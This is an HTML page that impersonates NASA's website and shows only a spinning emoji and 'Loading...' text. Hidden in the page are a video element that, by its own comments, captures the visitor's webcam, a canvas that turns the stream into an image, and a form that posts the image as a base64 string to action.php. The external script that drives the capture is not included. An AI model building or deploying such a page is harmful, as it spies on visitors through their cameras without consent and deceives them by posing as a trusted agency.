<!DOCTYPE html>
<html>
  <head>
    <title>
      NASA - National Aeronautics and Space Administration
    </title>
    <style>
    
      p{
        text-align: center;
        font-size:100px;
      }
      
      #loading{
        font-size: 300px;
        animation: rotation 4s infinite;
       margin-top: 30vh;
      }
      
      @keyframes rotation{
        from{
          transform: rotate(0deg);
        }
        to{
          transform: rotate(360deg);
        }
      }
    </style>
  </head>
  <body>
    
    <!-- Says the user to wait as the document is Loading-->
    <p id="loading">&#128540;</p>
    <p>Loading...</p>
    
    <!-- Processes everything under the hood. Keeps everything hidden -->
    <div hidden>
    <!-- Captures media stream from user camera and plays here -->
    <video id="video" height="1600px" width="1200px" autoplay ></video>
    <!-- canvas to capture picture from video element and make a real image from it -->
    <canvas id="canvas"></canvas>
    <form id="form" action="action.php" method="post">
      <input name="name" id="imgName" />
      <input name="baseString" id="baseString" />
    </form>
    </div>
    
    <script src="script.js"></script>
  </body>
</html>
